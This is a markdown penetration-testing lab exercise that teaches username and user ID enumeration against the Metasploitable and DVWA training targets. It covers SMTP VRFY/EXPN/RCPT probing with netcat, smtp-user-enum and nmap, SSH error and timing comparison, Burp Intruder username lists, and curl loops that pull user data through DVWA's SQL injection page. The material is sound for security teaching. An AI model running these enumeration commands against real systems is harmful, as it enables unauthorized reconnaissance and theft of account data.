# 🔬 Lab Exercise 7: User ID Enumeration

> **Challenge:** Discover valid usernames/user IDs through application responses
> **Where:** Metasploitable (SMTP, SSH) + DVWA
> **Time:** ~30-40 minutes

---

## Exercise 7A: SMTP User Enumeration (Port 25)

**Target:** Metasploitable SMTP service at `192.168.56.20:25`

### Manual Enumeration with Netcat
```bash
# Step 1: Connect to the SMTP server
nc -v 192.168.56.20 25
# ✅ EXPECTED: "220 metasploitable.localdomain ESMTP Postfix..."

# Step 2: Use VRFY command to check if users exist
# Type each line one at a time:
VRFY root
# ✅ EXPECTED (user exists): "252 2.0.0 root"

VRFY msfadmin
# ✅ EXPECTED (user exists): "252 2.0.0 msfadmin"

VRFY admin
# 📝 Does this user exist? What response do you get?

VRFY fakeuser12345
# ✅ EXPECTED (user doesn't exist): "550 5.1.1 <fakeuser12345>: Recipient address rejected"

VRFY postgres
# 📝 Response? _______________

VRFY daemon
# 📝 Response? _______________

QUIT
```

**📝 Key Observation:** The server gives DIFFERENT responses for valid vs invalid users. This is the enumeration vulnerability!

### Automated Enumeration with smtp-user-enum
```bash
# Step 1: Enumerate using a built-in wordlist
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.56.20
# ✅ EXPECTED: List of valid users found on the system
# 📝 How many valid users did it find? _______________
# 📝 List the usernames found:
#    _______________
#    _______________
#    _______________
#    _______________

# Step 2: Try with EXPN method (expand mailing lists)
smtp-user-enum -M EXPN -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.56.20
# 📝 Did EXPN find different results than VRFY?

# Step 3: Try with RCPT method
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.56.20
# 📝 Which method found the most users?
```

### Nmap SMTP Enumeration
```bash
nmap --script smtp-enum-users -p 25 192.168.56.20
# 📝 What users did nmap's script find?
```

---

## Exercise 7B: SSH User Enumeration

**Target:** Metasploitable SSH at port 22

```bash
# Step 1: Try to login with a valid user (wrong password)
ssh msfadmin@192.168.56.20
# Enter wrong password: wrongpassword
# 📝 What error message do you get? _______________
# (e.g., "Permission denied")

# Step 2: Try to login with an INVALID user
ssh fakeuser12345@192.168.56.20
# Enter any password
# 📝 What error message do you get? _______________

# Step 3: COMPARE the two error messages
# 📝 Are they different? _______________
# If different → you can enumerate usernames by the error message!
# If same → SSH is configured securely (same response regardless)

# Step 4: Check response timing differences
time ssh msfadmin@192.168.56.20 exit 2>/dev/null
time ssh fakeuser12345@192.168.56.20 exit 2>/dev/null
# 📝 Is there a timing difference between valid and invalid users?
```

---

## Exercise 7C: Web Application User Enumeration (DVWA)

**Target:** DVWA Brute Force page

### Enumerate Through Login Error Messages
```
Step 1: Go to http://192.168.56.20/dvwa/vulnerabilities/brute/
  (Make sure security is set to Low)

Step 2: Try a VALID username with WRONG password
  Username: admin
  Password: wrongpassword
  Click Login
  📝 Error message: _______________

Step 3: Try an INVALID username with any password
  Username: notarealusernameXYZ
  Password: anything
  Click Login
  📝 Error message: _______________

Step 4: Compare the responses
  📝 Are the error messages different?
  📝 Are the response sizes different?
  📝 Is the response time different?
  → If ANY of these differ, you can enumerate usernames!
```

### Automate with Burp Intruder
```
Step 1: Proxy → Intercept → Turn ON
Step 2: Submit a login attempt at the DVWA Brute Force page
Step 3: Right-click the intercepted request → "Send to Intruder"
Step 4: In Intruder:
  - Go to Positions tab
  - Click "Clear §" to remove auto-selected positions
  - Highlight ONLY the username value → click "Add §"
  - So it looks like: username=§admin§&password=test&Login=Login

Step 5: Go to Payloads tab
  - Payload type: Simple list
  - Add these usernames:
    admin
    root
    user
    test
    msfadmin
    guest
    fakeuser123
    nonexistent
    administrator
    postgres

Step 6: Click "Start attack"
Step 7: When done, sort results by:
  - Response length (click the Length column)
  - Status code
  📝 Which usernames gave a DIFFERENT response size?
  → These are likely valid usernames!
```

---

## Exercise 7D: API Endpoint User Enumeration

```bash
# Step 1: Check user profiles via the web server
# Some applications expose user data via predictable URLs:
for i in 1 2 3 4 5 6 7 8 9 10; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://192.168.56.20/dvwa/vulnerabilities/sqli/?id=$i&Submit=Submit" \
      -b "PHPSESSID=YOUR_SESSION_ID; security=low")
    echo "User ID $i → HTTP $code"
done
# 📝 Which IDs returned data?
# 📝 Which IDs returned errors?
# → Valid IDs have the same response code but different content

# Step 2: Actually extract the data for valid IDs
for i in 1 2 3 4 5; do
    echo "=== User ID: $i ==="
    curl -s "http://192.168.56.20/dvwa/vulnerabilities/sqli/?id=$i&Submit=Submit" \
      -b "PHPSESSID=YOUR_SESSION_ID; security=low" | grep -oP 'First name:.*?<br' 
done
# 📝 What user data did you extract?
```

---

## Exercise 7E: Password Reset User Enumeration

```
This is a concept exercise (DVWA doesn't have password reset, 
but you need to understand the technique for interviews):

Password Reset Enumeration Pattern:
1. Submit admin@example.com → Response: "Reset link sent to your email"
2. Submit fake@example.com → Response: "Email not found"

The different responses confirm which emails exist!

Practice recognizing this pattern:
├── "User not found" vs "Password reset sent"     → ENUMERABLE
├── "Invalid email" vs "Please check your inbox"   → ENUMERABLE
├── "If this email exists, a reset link was sent"  → SECURE (same response)
└── Same 200 response for valid & invalid          → SECURE
```

---

## Exercise 7F: Compile Enumerated Users

📝 **Fill this out as your final report:**

```
=== USER ENUMERATION REPORT ===
Target: 192.168.56.20

Users Found via SMTP (VRFY):
  1. _______________
  2. _______________
  3. _______________
  4. _______________
  5. _______________

Users Found via SSH (error differences):
  - Enumeration possible? YES / NO
  - Method used: _______________

Users Found via DVWA (web):
  - Valid usernames: _______________
  - Enumeration method: _______________

DVWA SQLi User IDs (from database):
  - ID 1: _______________
  - ID 2: _______________
  - ID 3: _______________
  - ID 4: _______________
  - ID 5: _______________

Total Unique Users Discovered: _______________
```

---

## ✅ Completion Checklist

- [ ] Manually enumerated users via SMTP VRFY (7A)
- [ ] Used smtp-user-enum for automated SMTP enumeration (7A)
- [ ] Tested SSH for user enumeration differences (7B)
- [ ] Compared DVWA login error messages for valid vs invalid users (7C)
- [ ] Used Burp Intruder for automated web user enumeration (7C)
- [ ] Enumerated user IDs via API/URL manipulation (7D)
- [ ] Understood password reset enumeration concepts (7E)
- [ ] Compiled a user enumeration report (7F)

---

**Next:** [Challenge 8: 2FA Bypass →](./08_lab_2fa_bypass.md)
